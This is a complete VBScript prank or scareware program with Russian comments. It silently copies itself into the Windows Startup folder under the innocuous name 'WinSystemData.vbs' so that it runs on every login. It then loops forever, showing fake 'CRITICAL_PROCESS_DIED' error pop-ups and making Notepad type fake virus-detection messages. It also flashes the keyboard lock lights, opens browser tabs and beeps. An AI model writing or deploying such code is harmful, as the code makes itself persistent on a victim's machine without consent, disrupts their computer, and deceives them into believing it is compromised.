On Error Resume Next
Set w = CreateObject("WScript.Shell")
Set f = CreateObject("Scripting.FileSystemObject")

' --- 1. ТИХАЯ АВТОЗАГРУЗКА ---
p = w.SpecialFolders("Startup") & "\WinSystemData.vbs"
If Not f.FileExists(p) Then f.CopyFile WScript.ScriptFullName, p

' --- 2. ЦИКЛ ХАОСА (Каждые 5-10 секунд) ---
Do
    Randomize
    action = Int(Rnd * 5) ' Выбираем случайную пакость

    Select Case action
        Case 0 ' Взрыв окон ошибок в разных углах (3 штуки сразу)
            For i = 1 To 3
                x = Int(Rnd * 1200) : y = Int(Rnd * 800)
                errID = Hex(Int(Rnd * 1000000))
                w.Run "mshta vbscript:Execute(""window.moveTo " & x & "," & y & ":msgbox """"CRITICAL_PROCESS_DIED: 0x" & errID & """"",16+4096,""""Windows Recovery"""" : window.close"")", 0, False
            Next
        
        Case 1 ' "Живой" Блокнот (печатает сам)
            w.Run "notepad.exe"
            WScript.Sleep 1000
            w.AppActivate "Notepad"
            w.SendKeys "SYSTEM FAILURE... {ENTER}"
            w.SendKeys "VIRUS_DETECTION... {ENTER}"
            w.SendKeys "PLEASE REINSTALL WINDOWS OR CALL ATB SUPPORT... {ENTER}"
        
        Case 2 ' Светомузыка на клавиатуре (мигаем Caps/Num/Scroll)
            For j = 1 To 5
                w.SendKeys "{CAPSLOCK}"
                w.SendKeys "{NUMLOCK}"
                w.SendKeys "{SCROLLLOCK}"
                WScript.Sleep 100
            Next
            
        Case 3 ' Рандомная вкладка (поиск спасения)
            sites = Array("https://www.atbmarket.com/", "https://google.com/search?q=ВАС+ВЗЛОМАЛИ+fix")
            w.Run sites(Int(Rnd * 2))
            
        Case 4 ' Системный "писк" из динамиков (раздражает)
            w.Run "cmd /c echo " & Chr(7), 0, False
    End Select

    ' Пауза между приколами (от 5 до 10 секунд, чтобы было внезапно)
    WScript.Sleep Int((10000 - 5000 + 1) * Rnd + 5000) 
Loop